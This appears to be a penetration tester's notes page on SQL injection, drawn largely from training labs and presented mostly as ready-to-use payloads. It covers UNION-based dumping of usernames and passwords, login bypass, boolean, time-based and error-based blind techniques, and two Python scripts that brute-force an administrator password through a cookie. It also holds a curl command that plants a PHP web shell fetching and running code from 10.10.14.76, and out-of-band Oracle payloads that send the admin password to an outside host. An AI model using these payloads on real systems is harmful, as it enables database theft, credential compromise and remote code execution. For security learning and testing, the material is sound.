---
title: SQL Injection
source_url: https://notes.incendium.rocks/pentesting-notes/web/injection/sql-injection
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: web
---

The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query.

***

### **In-Band SQL Injection**

In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.

The first thing we need to do is return data to the browser without displaying an error message. Firstly we'll try the UNION operator so we can receive an extra result of our choosing. Try setting the mock browsers id parameter to:

```sql
1 UNION SELECT 1
```

This statement should produce an error message informing you that the UNION SELECT statement has a different number of columns than the original SELECT query. So let's try again but add another column:

```sql
1 UNION SELECT 1,2
```

Same error again, so let's repeat by adding another column:

```sql
1 UNION SELECT 1,2,3
```

Success, the error message has gone, and the article is being displayed, but now we want to display our data instead of the article. The article is being displayed because it takes the first returned result somewhere in the web site's code and shows that. To get around that, we need the first query to produce no results. This can simply be done by changing the article id from 1 to 0.

```sql
0 UNION SELECT 1,2,3
```

You'll now see the article is just made up of the result from the UNION select returning the column values 1, 2, and 3. We can start using these returned values to retrieve more useful information. First, we'll get the database name that we have access to:

```sql
0 UNION SELECT 1,2,database()
```

You'll now see where the number 3 was previously displayed; it now shows the name of the database, which is **sqli\_one**.

Our next query will gather a list of tables that are in this database.

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

There are a couple of new things to learn in this query. Firstly, the method **group\_concat()** gets the specified column (in our case, table\_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the **information\_schema** database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the **sqli\_one** database, which is article and staff\_users.

As the first level aims to discover Martin's password, the staff\_users table is what is of interest to us. We can utilise the information\_schema database again to find the structure of this table using the below query.

```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

This is similar to the previous SQL query. However, the information we want to retrieve has changed from table\_name to **column\_name**, the table we are querying in the information\_schema database has changed from tables to **columns**, and we're searching for any rows where the **table\_name** column has a value of **staff\_users**.

The query results provide three columns for the staff\_users table: id, password, and username. We can use the username and password columns for our following query to retrieve the user's information.

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

Again we use the group\_concat method to return all of the rows into one string and to make it easier to read. We've also added **,':',** to split the username and password from each other. Instead of being separated by a comma, we've chosen the HTML \
&#x20;tag that forces each result to be on a separate line to make for easier reading.

***

### Determine database type

```
' or 'foobar' ='foo'||'bar' -- Oracle or PostgreSQL
' or 'foobar' ='foo'+'bar' -- MS SQL
' or 'foobar' ='foo' 'bar' -- MySQL
```

### Authentication bypass

**Blind SQLi**

Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. It might surprise you that all we need is that little bit of feedback to successful enumerate a whole database.

To make this into a query that always returns as true, we can enter the following into the password field:

```sql
' OR 1=1;--
```

***

### **Boolean Based**

Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes. That outcome confirms to us that our SQL Injection payload was either successful or not

The browser body contains the contents of **{"taken":true}.** This API endpoint replicates a common feature found on many signup forms, which checks whether a username has already been registered to prompt the user to choose a different username.

```sql
select * from users where username = '%username%' LIMIT 1;
```

SQL injection:

```sql
admin123' UNION SELECT 1,2,3;--
```

Returns: {"taken":true}

Find database:

```sql
admin123' UNION SELECT 1,2,3 where database() like 's%';--
```

Find table:

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
```

Find password:

```sql
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```

***

### **Time-Based**

A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as **SLEEP(x)** alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement.&#x20;

So, for example, when trying to establish the number of columns in a table, you would use the following query:

```sql
admin123' UNION SELECT SLEEP(5);--
```

If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:

```sql
admin123' UNION SELECT SLEEP(5),2;--
```

```sql
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
```

## Write files using curl and SQL injection

```bash
curl -s $'http://example.com/shop/index.php?page=product&id=%0A\'%3bselect+\'<%3fphp+system(\"curl+http%3a//10.10.14.76%7csh\")%3b%3f>\'+into+outfile+\'/var/lib/mysql/incendium2.php\'+%231'
```

## Blind SQL injection with MSSQL

A good reference:

## Blind SQL injection with conditional responses

For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. You can determine the password for this user by sending a series of inputs to test the password one character at a time.

First we find the length of the password:

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

Next, we can use this script to determine the password:

```python
import requests

# Set up the target URL and headers
url = 'vulnerable-website/'  # Replace with the actual target URL
cookie_template = "TrackingId=4o1XPA9uXRhdgkCK' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{char}"

# The possible characters in the password
characters = 'abcdefghijklmnopqrstuvwxyz0123456789'

# Initialize variables
password = ''
password_length = #PasswordLength here (20 for example)

# Loop through each position of the password
for pos in range(1, password_length + 1):
    found = False
    for char in characters:
        # Construct the cookie with the current character and position
        cookie_value = cookie_template.format(pos=pos, char=char)
        headers = {
            'Cookie': cookie_value
        }
        # Send the HTTP request
        response = requests.get(url, headers=headers)

        # Check the response to see if the character is correct
        if 'Welcome back!' in response.text:  # Replace with the actual text indicating a successful guess
            password += char
            found = True
            print(f"Found character {pos}: {char}")
            break

    if not found:
        print(f"Could not find a valid character for position {pos}")
        break

print(f"The password is: {password}")

```

## Exploiting blind SQL injection by triggering conditional errors <a href="#exploiting-blind-sql-injection-by-triggering-conditional-errors" id="exploiting-blind-sql-injection-by-triggering-conditional-errors"></a>

Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique in the previous section won't work, because injecting different boolean conditions makes no difference to the application's responses.

It's often possible to induce the application to return a different response depending on whether a SQL error occurs. You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message. This enables you to infer the truth of the injected condition.

For Non-oracle:

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

For Oracle:

```
xyz' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END)='a
```

Get password by checking the status code of 500 in a python script of a oracle database:

```python
import requests

# Set up the target URL and headers
url = 'https://vulnerable-website.com/'  # Replace with the actual target URL
cookie_template = "TrackingId=MUPx0MxLaZMT409u'||(SELECT CASE WHEN SUBSTR(password,{pos},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"

# The possible characters in the password
characters = 'abcdefghijklmnopqrstuvwxyz0123456789'

# Initialize variables
password = ''
password_length = 20

# Loop through each position of the password
for pos in range(1, password_length + 1):
    found = False
    for char in characters:
        # Construct the cookie with the current character and position
        cookie_value = cookie_template.format(pos=pos, char=char)
        headers = {
            'Cookie': cookie_value
        }
        # Send the HTTP request
        response = requests.get(url, headers=headers)

        # Check the response to see if the character is correct
        if response.status_code == 500:
            password += char
            found = True
            print(f"Found character {pos}: {char}")
            break

    if not found:
        print(f"Could not find a valid character for position {pos}")
        break

print(f"The password is: {password}")

```

## Visible error-based SQL injection

Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker.

Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a visible one.

You can use the `CAST()` function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:

```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

Returns:

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2F6NZayVW1oF0sihN4Z9nU%2Fimage.png?alt=media&amp;token=5ae7cf7c-f973-49c6-a50d-3fa04b20185a" alt=""><figcaption></figcaption></figure>

### Blind SQL injection with out-of-band interaction

An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, but none of the techniques described so far will work. The application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.

```http
GET / HTTP/2
Host: vulnerable-host.com
Cookie: TrackingId=x8mlY9v9TRXwhjLi'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//9hrgd7ehcjtxg99odwknkneqiho8c80x.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; session=mwBIVr07rUBjmFGsUcVjNSlkQWo541VX
```

## Blind SQL injection with out-of-band data exfiltration

Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example with Oracle:

```http
GET /filter?category=Tech+gifts HTTP/2
Host: vulnerable-host.com
Cookie: TrackingId=cvLvR9PpFfAQEU8s'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+from+users+where+username='administrator')||'.cjzjfagkemv0icbrfzmqmqgtkkqbe25qu.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; session=mwBIVr07rUBjmFGsUcVjNSlkQWo541VX;
```
